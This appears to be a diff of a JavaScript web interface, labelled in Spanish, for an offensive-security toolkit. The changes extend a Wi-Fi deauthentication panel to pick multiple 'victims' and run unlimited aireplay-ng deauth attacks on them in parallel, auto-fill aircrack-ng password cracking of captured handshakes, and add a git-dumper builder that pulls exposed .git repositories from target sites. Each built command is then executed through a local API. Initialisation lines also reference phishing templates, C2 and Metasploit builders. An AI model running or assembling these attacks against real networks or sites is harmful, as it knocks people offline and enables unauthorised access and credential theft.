+  ds.innerHTML=`<span style="color:var(--red)">⚡ ATACANDO</span>  ${tgt}  <span style="color:var(--mut)">pkts:</span> <span style="color:var(--red)">${wdState.deauthPkts}</span>  <span style="color:#2a0a0a">${bar}</span>`;
 }
 function wdShowDisconnected(){
   const ds=document.getElementById('wd-deauth-status'); if(!ds)return;
+  const sts=wdState.selectedStations;
+  const t=sts.length>1?`${sts.length} dispositivos`:sts[0]||'';
   ds.style.borderColor='var(--g)'; ds.style.background='#020a03';
-  ds.innerHTML=`<span style="color:var(--g);font-size:14px">✓ DISPOSITIVO DESCONECTADO</span>  <span style="color:var(--mut)">${gv('wd-st')||''}</span>`;
+  ds.innerHTML=`<span style="color:var(--g);font-size:14px">✓ DESCONECTADO</span>  <span style="color:var(--mut)">${t}</span>`;
 }
 
+/* ── AP selection — resets all station state ─────────── */
 function wdSelectAP(bssid,ch){
+  const apData=wdState.aps[bssid.toUpperCase()]||{};
+  wdState.selectedAP={bssid:bssid.toUpperCase(), ch, essid:apData.essid||''};
+
+  // Hard-reset stations and victim selection for the new AP
+  wdState.stations={};
+  wdState.selectedStations=[];
+  wdUpdateStationBadge();
+  wdLockCard(4);   // no victims yet — disable ATTACK
+
+  // Fill input fields
   const b=document.getElementById('wd-bs'),c=document.getElementById('wd-ch');
   if(b){b.value=bssid;b.style.outline='1px solid var(--g)';setTimeout(()=>{b.style.outline='';},600);}
   if(c){c.value=ch;c.style.outline='1px solid var(--g)';setTimeout(()=>{c.style.outline='';},600);}
-  bWd(); wdUnlock(3);
-}
-function wdSelectStation(mac){
-  const s=document.getElementById('wd-st');
-  if(s){s.value=mac;s.style.outline='1px solid var(--yellow)';setTimeout(()=>{s.style.outline='';},600);}
-  bWd(); wdUnlock(4);
+
+  bWd();
+  wdUnlock(3);
+  _wdDrawAPTable();   // re-render AP table with selection highlight
 }
 
+/* ── Station toggle ──────────────────────────────────── */
+function wdSelectStation(mac){
+  const sts=wdState.selectedStations;
+  const idx=sts.indexOf(mac);
+  if(idx===-1) sts.push(mac);
+  else sts.splice(idx,1);
+  wdUpdateStationBadge();
+  bWd();
+  if(sts.length>0) wdUnlock(4);
+  else wdLockCard(4);
+  _wdDrawStations();   // re-render station table with updated checkmarks
+}
+
+function wdUpdateStationBadge(){
+  const el=document.getElementById('wd-station-badge'); if(!el)return;
+  const n=wdState.selectedStations.length;
+  const vc=document.getElementById('wd-victim-count');
+  if(n===0){
+    el.innerHTML='<span style="color:var(--dim);font-style:italic">ninguna seleccionada</span>';
+    if(vc)vc.textContent='0 víctimas';
+  } else {
+    el.innerHTML=`<span style="color:var(--red);font-weight:700">${n}</span>&nbsp;<span style="color:var(--yellow)">${n===1?'víctima':'víctimas'}</span><span style="color:var(--dim);font-size:11px;margin-left:6px">${wdState.selectedStations.slice(0,2).join(', ')}${n>2?' …':''}</span>`;
+    if(vc)vc.textContent=`${n} víctima${n>1?'s':''}`;
+  }
+}
+
+/* ── Button state helpers ────────────────────────────── */
 function wdSetRunning(btn){
   wdState.activeBtn=btn;
   if(btn){btn.classList.add('running');btn.textContent='RUNNING...';}
@@ -5427,60 +5686,76 @@ function wdClearTimers(){
 
 function wdStartCountdown(secs){
   let n=secs;
-  const tick=()=>{
-    const el=document.getElementById('wd-cd-n');
-    if(el)el.textContent=n;
-    n--;
-  };
+  const tick=()=>{const el=document.getElementById('wd-cd-n');if(el)el.textContent=n;n--;};
   tick();
   wdState.cdInterval=setInterval(tick,1000);
 }
 
+/* ── Auto-stop after timer ───────────────────────────── */
 function wdAutoStop(step){
   wdClearTimers();
   stopTool('wd');
   wdResetBtn('▶ RUN');
-  // force final render
-  _wdDraw();
-  const aps=Object.values(wdState.aps), stations=Object.values(wdState.stations);
   const lc=document.getElementById('wd-live-content');
+
   if(step===2){
+    const aps=Object.values(wdState.aps);
+    _wdDrawAPTable();
     const msg=aps.length
-      ? `<div style="font-size:12px;color:var(--g);padding:3px 0 6px">✓ Escaneo completo — ${aps.length} redes. Click en fila para seleccionar BSSID+CH.</div>`
-      : `<div style="font-size:13px;color:var(--yellow);padding:6px 0">Sin redes encontradas. Verifica la interfaz MON.</div>`;
+      ?`<div style="font-size:12px;color:var(--g);padding:3px 0 7px">✓ ${aps.length} redes encontradas — click en fila para enfocar AP.</div>`
+      :`<div style="font-size:13px;color:var(--yellow);padding:6px 0">Sin redes encontradas. Verifica la interfaz MON.</div>`;
     if(lc)lc.insertAdjacentHTML('afterbegin',msg);
   }
+
   if(step===3){
+    const stations=Object.values(wdState.stations);
+    const ap=wdState.selectedAP;
+    const apLabel=ap?`<span style="color:var(--cyan)">${ap.essid||ap.bssid}</span>`:'este AP';
+    _wdDrawStations();
     const msg=stations.length
-      ? `<div style="font-size:12px;color:var(--g);padding:3px 0 6px">✓ Escaneo completo — ${stations.length} dispositivos. Click en fila para seleccionar STATION.</div>`
-      : `<div style="font-size:13px;color:var(--yellow);padding:6px 0">Sin dispositivos visibles. Espera más o prueba con --band a para 5GHz.</div>`;
+      ?`<div style="font-size:12px;color:var(--g);padding:3px 0 7px">✓ ${stations.length} cliente${stations.length!==1?'s':''} encontrado${stations.length!==1?'s':''} para ${apLabel}. Click en fila para seleccionar víctima(s).</div>`
+      :`<div style="font-size:13px;color:var(--yellow);padding:6px 0">Sin clientes asociados detectados para ${apLabel}.</div>`;
     if(lc)lc.insertAdjacentHTML('afterbegin',msg);
   }
 }
 
+/* ── Run steps ───────────────────────────────────────── */
 function wdRun(step,btn){
   wdClearTimers();
   wdState.step=step;
+
   if(step===2){
     wdState.aps={};
     wdLive(`<div style="font-size:13px;color:var(--mut);padding:4px 0">Escaneando redes... para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">15</span>s</div>`);
     wdStartCountdown(15);
     wdState.autoStopTimer=setTimeout(()=>wdAutoStop(2),15000);
   }
+
   if(step===3){
+    // Fresh start — discard any previous station data for this scan
     wdState.stations={};
-    wdLive(`<div style="font-size:13px;color:var(--mut);padding:4px 0">Escaneando dispositivos... para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">10</span>s</div>`);
+    wdState.selectedStations=[];
+    wdUpdateStationBadge();
+    wdLockCard(4);
+    const ap=wdState.selectedAP;
+    const apLabel=ap
+      ?`<span style="color:var(--cyan)">${ap.essid||ap.bssid}</span> — <span style="color:var(--g)">${ap.bssid}</span> — canal <span style="color:var(--g)">${ap.ch}</span>`
+      :'AP seleccionado';
+    wdLive(`<div style="font-size:12px;color:var(--mut);margin-bottom:5px">Escaneando clientes de: ${apLabel}</div><div style="font-size:13px;color:var(--mut)">Para automáticamente en <span id="wd-cd-n" style="color:var(--cyan)">10</span>s</div>`);
     wdStartCountdown(10);
     wdState.autoStopTimer=setTimeout(()=>wdAutoStop(3),10000);
   }
+
   if(step===4){
     wdState.deauthPkts=0;wdState.disconnected=false;
     const ds=document.getElementById('wd-deauth-status');
     if(ds){ds.style.display='block';ds.style.borderColor='#3a1010';ds.style.background='#070101';ds.innerHTML='<span style="color:var(--mut)">Iniciando ataque...</span>';}
   }
+
   wdSetRunning(btn);
   execCmd(getCmdText('wd-'+step),'wd-out-c','wd-out','wd');
 }
+
 function wdStop(){
   wdClearTimers();
   const wasDeauth=wdState.step===4;
@@ -5490,18 +5765,23 @@ function wdStop(){
     const ds=document.getElementById('wd-deauth-status');
     if(ds){
       ds.style.borderColor='var(--yellow)';ds.style.background='#090700';
-      ds.innerHTML=`<span style="color:var(--yellow)">■ DETENIDO</span>  pkts: <span style="color:var(--yellow)">${wdState.deauthPkts}</span>  —  <span style="color:var(--g)">dispositivo desconectado</span>`;
+      ds.innerHTML=`<span style="color:var(--yellow)">■ DETENIDO</span>  pkts: <span style="color:var(--yellow)">${wdState.deauthPkts}</span>  —  <span style="color:var(--g)">dispositivos procesados</span>`;
     }
   }
-  // if manually stopped mid-scan, still render what we have
-  if(wdState.step===2||wdState.step===3) _wdDraw();
+  if(wdState.step===2) _wdDrawAPTable();
+  if(wdState.step===3) _wdDrawStations();
 }
+
 function wdClearState(){
   wdClearTimers();
   wdState.aps={};wdState.stations={};wdState.step=0;wdState.deauthPkts=0;wdState.disconnected=false;
+  wdState.selectedAP=null;
+  wdState.selectedStations=[];
+  wdUpdateStationBadge();
+  bWd();
   wdLive('<div style="font-size:13px;color:var(--dim);font-style:italic;padding:8px 0;text-align:center">Pon la interfaz arriba y ejecuta PASO 1</div>');
   const ds=document.getElementById('wd-deauth-status');if(ds){ds.style.display='none';ds.innerHTML='';}
-  [2,3,4].forEach(n=>{const c=document.getElementById('wd-card-'+n);if(c){c.style.opacity='.5';c.style.pointerEvents='none';}});
+  [2,3,4].forEach(n=>wdLockCard(n));
 }
 
 // called by execCmd when job finishes naturally (done event)
@@ -6246,12 +6526,145 @@ function bTcpdump() {
   setH('td-cmd', cmd);
 }
 function bAir() {
-  const i=gv('ac-if')||'wlan0', bs=gv('ac-bs')||'AA:BB:CC:DD:EE:FF', ch=gv('ac-ch')||'6', wl=gv('ac-wl')||'/usr/share/wordlists/rockyou.txt';
-  setH('ac-1', `<span class="b">airmon-ng</span> <span class="f">start</span> <span class="v">${i}</span>`);
-  setH('ac-5', `<span class="b">airodump-ng</span> <span class="v">${i}mon</span>`);
-  setH('ac-2', `<span class="b">airodump-ng</span> <span class="f">-c</span> <span class="v">${ch}</span> <span class="f">--bssid</span> <span class="v">${bs}</span> <span class="f">-w /tmp/captura</span> <span class="v">${i}mon</span>`);
-  setH('ac-3', `<span class="b">aireplay-ng</span> <span class="f">-0 5 -a</span> <span class="v">${bs}</span> <span class="v">${i}mon</span>`);
-  setH('ac-4', `<span class="b">aircrack-ng</span> <span class="f">-w</span> <span class="v">${wl}</span> <span class="f">-b</span> <span class="v">${bs}</span> <span class="v">/tmp/captura-01.cap</span>`);
+  const pfx = sp();
+  const i   = gv('ac-if') || 'wlan0';
+  const wl  = gv('ac-wl') || '/usr/share/wordlists/rockyou.txt';
+  const cap = gv('ac-cap') || '/tmp/captura-01.cap';
+
+  // Auto-fill BSSID+CH from WiFi Disconnect if own fields are empty
+  let bs = gv('ac-bs');
+  let ch = gv('ac-ch');
+  const wdBs = gv('wd-bs'), wdCh = gv('wd-ch');
+  if (!bs && wdBs && wdBs !== 'AA:BB:CC:DD:EE:FF') {
+    const inp = document.getElementById('ac-bs');
+    if (inp) { inp.value = wdBs; }
+    bs = wdBs;
+    const hint = document.getElementById('ac-autofill-hint');
+    if (hint) hint.style.display = 'block';
+  }
+  if (!ch && wdCh && wdCh !== '6') {
+    const inp = document.getElementById('ac-ch');
+    if (inp) { inp.value = wdCh; }
+    ch = wdCh;
+  }
+  bs = bs || 'AA:BB:CC:DD:EE:FF';
+  ch = ch || '6';
+
+  const capBase = cap.replace(/-01\.cap$/, '').replace(/\.cap$/, '');
+  const capHint = document.getElementById('ac-cap-hint');
+  if (capHint) capHint.textContent = capBase;
+
+  setH('ac-1', `<span class="b">${pfx}airmon-ng</span> <span class="f">start</span> <span class="v">${i}</span>`);
+  setH('ac-5', `<span class="b">${pfx}airodump-ng</span> <span class="v">${i}mon</span>`);
+  setH('ac-2', `<span class="b">${pfx}airodump-ng</span> <span class="f">-c</span> <span class="v">${ch}</span> <span class="f">--bssid</span> <span class="v">${bs}</span> <span class="f">-w</span> <span class="v">${capBase}</span> <span class="v">${i}mon</span>`);
+  setH('ac-3', `<span class="b">${pfx}aireplay-ng</span> <span class="f">-0 5 -a</span> <span class="v">${bs}</span> <span class="v">${i}mon</span>`);
+  setH('ac-4', `<span class="b">aircrack-ng</span> <span class="f">-w</span> <span class="v">${wl}</span> <span class="f">-b</span> <span class="v">${bs}</span> <span class="v">${cap}</span>`);
+}
+
+function acClearAutoFill() {
+  ['ac-bs','ac-ch'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});
+  const hint=document.getElementById('ac-autofill-hint');if(hint)hint.style.display='none';
+  bAir();
+}
+
+function acCrack() {
+  const bs  = gv('ac-bs'), cap = gv('ac-cap') || '/tmp/captura-01.cap', wl = gv('ac-wl');
+  const warn = document.getElementById('ac-crack-warn');
+  if (!bs || bs === 'AA:BB:CC:DD:EE:FF' || !cap || !wl) {
+    if (warn) warn.style.display = 'block';
+    setTimeout(()=>{ if(warn) warn.style.display='none'; }, 3000);
+    return;
+  }
+  if (warn) warn.style.display = 'none';
+  execDirect(getCmdText('ac-4'));
+}
+
+/* ─── GIT-DUMPER BUILDER ──────────────────────────────── */
+function bGd() {
+  let url = gv('gd-url').trim();
+  if (!url) { setH('gd-cmd', '<span style="color:var(--dim)">git-dumper http://target.com/.git ./dumped-repo</span>'); return; }
+
+  // Normalize: ensure scheme
+  if (!url.match(/^https?:\/\//i)) url = 'http://' + url;
+  // Auto-append /.git if missing
+  if (!url.replace(/\/$/, '').endsWith('/.git')) {
+    url = url.replace(/\/$/, '') + '/.git';
+  }
+
+  const outDir  = gv('gd-outdir')   || './dumped-repo';
+  const jobs    = gv('gd-jobs');
+  const retry   = gv('gd-retry');
+  const timeout = gv('gd-timeout');
+  const proxy   = gv('gd-proxy');
+  const ua      = gv('gd-ua');
+  const cookie  = gv('gd-cookie');
+  const extra   = chks('gd-op');
+
+  // Collect dynamic headers
+  const hdrs = [];
+  document.querySelectorAll('#gd-headers .header-row').forEach(row => {
+    const ins = row.querySelectorAll('input');
+    const k = ins[0] ? ins[0].value.trim() : '';
+    const v = ins[1] ? ins[1].value.trim() : '';
+    if (k && v) hdrs.push(`${k}: ${v}`);
+  });
+
+  let parts = [];
+  if (jobs)    parts.push(`--jobs ${jobs}`);
+  if (retry)   parts.push(`--retry ${retry}`);
+  if (timeout) parts.push(`--timeout ${timeout}`);
+  if (proxy)   parts.push(`--proxy ${proxy}`);
+  if (ua)      parts.push(`--user-agent '${ua}'`);
+  if (cookie)  parts.push(`--cookie '${cookie}'`);
+  hdrs.forEach(h => parts.push(`--header '${h}'`));
+  if (extra)   parts.push(extra);
+
+  const flagStr = parts.length ? ' ' + parts.join(' ') : '';
+  const full    = `git-dumper ${url} ${outDir}${flagStr}`;
+
+  setH('gd-cmd',
+    `<span class="b">git-dumper</span> <span class="v">${url}</span> <span class="v">${outDir}</span>` +
+    (jobs    ? ` <span class="f">--jobs</span> <span class="v">${jobs}</span>` : '') +
+    (retry   ? ` <span class="f">--retry</span> <span class="v">${retry}</span>` : '') +
+    (timeout ? ` <span class="f">--timeout</span> <span class="v">${timeout}</span>` : '') +
+    (proxy   ? ` <span class="f">--proxy</span> <span class="v">${proxy}</span>` : '') +
+    (ua      ? ` <span class="f">--user-agent</span> <span class="v">'${ua}'</span>` : '') +
+    (cookie  ? ` <span class="f">--cookie</span> <span class="v">'${cookie}'</span>` : '') +
+    hdrs.map(h => ` <span class="f">--header</span> <span class="v">'${h}'</span>`).join('') +
+    (extra   ? ` <span class="f">${extra}</span>` : '')
+  );
+}
+
+function gdAddHeader() {
+  const c = document.getElementById('gd-headers'); if (!c) return;
+  const row = document.createElement('div');
+  row.className = 'header-row';
+  row.innerHTML = '<input class="fi" placeholder="Header name" style="max-width:140px" oninput="bGd()">' +
+                  '<input class="fi" placeholder="Value" oninput="bGd()">' +
+                  '<button class="del-btn" onclick="gdDelHeader(this)">✕</button>';
+  c.appendChild(row);
+  bGd();
+}
+function gdDelHeader(btn) { btn.parentElement.remove(); bGd(); }
+
+function gdInstall() {
+  const s = document.getElementById('gd-install-status');
+  if (s) { s.style.color = 'var(--mut)'; s.textContent = 'Instalando...'; }
+  execCmd('pip3 install git-dumper', 'gd-out-c', 'gd-out', 'gd-inst');
+}
+
+function gdCheckInstall() {
+  const s = document.getElementById('gd-install-status');
+  if (!serverOk) { if (s) { s.style.color = 'var(--red)'; s.textContent = 'Servidor offline'; } return; }
+  fetch(API + '/check', {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ tool: 'git-dumper' })
+  }).then(r => r.json()).then(d => {
+    if (s) {
+      if (d.found) { s.style.color = 'var(--g)'; s.textContent = '✓ instalado en ' + (d.path || 'PATH'); }
+      else         { s.style.color = 'var(--red)'; s.textContent = '✗ git-dumper: not found — usa INSTALAR'; }
+    }
+  }).catch(() => { if (s) { s.style.color = 'var(--red)'; s.textContent = 'Error de red'; } });
 }
 
 /* ─── WIFI DISCONNECT BUILDER ─────────────────────────── */
@@ -6260,16 +6673,27 @@ function bWd() {
   const monIface = gv('wd-mon')  || (iface + 'mon');
   const bs       = gv('wd-bs')   || 'AA:BB:CC:DD:EE:FF';
   const ch       = gv('wd-ch')   || '6';
-  const st       = gv('wd-st')   || 'BB:CC:DD:EE:FF:00';
   const band     = gv('wd-band') || 'bg';
+  const pfx      = sp();
 
   const monInput = document.getElementById('wd-mon');
   if (monInput && !gv('wd-mon')) monInput.placeholder = monIface;
 
-  setH('wd-1', `<span class="b">sudo airmon-ng</span> <span class="f">start</span> <span class="v">${iface}</span>`);
-  setH('wd-2', `<span class="b">sudo airodump-ng</span> <span class="f">--band ${band}</span> <span class="v">${monIface}</span>`);
-  setH('wd-3', `<span class="b">sudo airodump-ng</span> <span class="f">--band ${band} -c</span> <span class="v">${ch}</span> <span class="f">--bssid</span> <span class="v">${bs}</span> <span class="v">${monIface}</span>`);
-  setH('wd-4', `<span class="b">sudo aireplay-ng</span> <span class="f">-0 0 -a</span> <span class="v">${bs}</span> <span class="f">-c</span> <span class="v">${st}</span> <span class="v">${monIface}</span>`);
+  setH('wd-1', `<span class="b">${pfx}airmon-ng</span> <span class="f">start</span> <span class="v">${iface}</span>`);
+  setH('wd-2', `<span class="b">${pfx}airodump-ng</span> <span class="f">--band ${band}</span> <span class="v">${monIface}</span>`);
+  setH('wd-3', `<span class="b">${pfx}airodump-ng</span> <span class="f">--band ${band} -c</span> <span class="v">${ch}</span> <span class="f">--bssid</span> <span class="v">${bs}</span> <span class="v">${monIface}</span>`);
+
+  const sts = wdState.selectedStations;
+  let cmd4 = '';
+  if (!sts || sts.length === 0) {
+    cmd4 = `<span class="b">${pfx}aireplay-ng</span> <span class="f">-0 0 -a</span> <span class="v">${bs}</span> <span class="f">-c</span> <span style="color:var(--dim)">??:??:??:??:??:??</span> <span class="v">${monIface}</span>`;
+  } else if (sts.length === 1) {
+    cmd4 = `<span class="b">${pfx}aireplay-ng</span> <span class="f">-0 0 -a</span> <span class="v">${bs}</span> <span class="f">-c</span> <span class="v">${sts[0]}</span> <span class="v">${monIface}</span>`;
+  } else {
+    const parts = sts.map(s=>`${pfx}aireplay-ng -0 0 -a ${bs} -c ${s} ${monIface}`).join(' & ');
+    cmd4 = `<span class="b">bash</span> <span class="f">-c</span> <span class="v">'${parts} & wait'</span>`;
+  }
+  setH('wd-4', cmd4);
 }
 
 /* ─── CURL BUILDER ────────────────────────────────────── */
@@ -9545,6 +9969,7 @@ bSql(); bJohn(); bHc(); bHyd(); bMedusa();
 bMsf(); bSs(); bAdEnum(); bSmb(); bKerb();
 bExec(); bCreds(); bBh(); bMitm();
 bTcpdump(); bAir(); bWd(); bCurl(); bWget(); bHttpx();
+bGd();
 bSpyBeacon(); bSpyMsf(); bSpyPS(); bSpySwaks(); bSpyGoph(); bSpyBrowser(); updateC2URL();
 // load template editor with default
 mobTmplLoad('whatsapp', null);
@@ -9553,6 +9978,7 @@ gobMode();
 bindGobDns();
 // bind new checks
 bc('gb-dns-op', bGob); bc('gb-vhost-op', bGob);
+bc('gd-op', bGd);
 // ── restore last active panel across reloads ────────────
 (function restoreNav() {
   let saved;
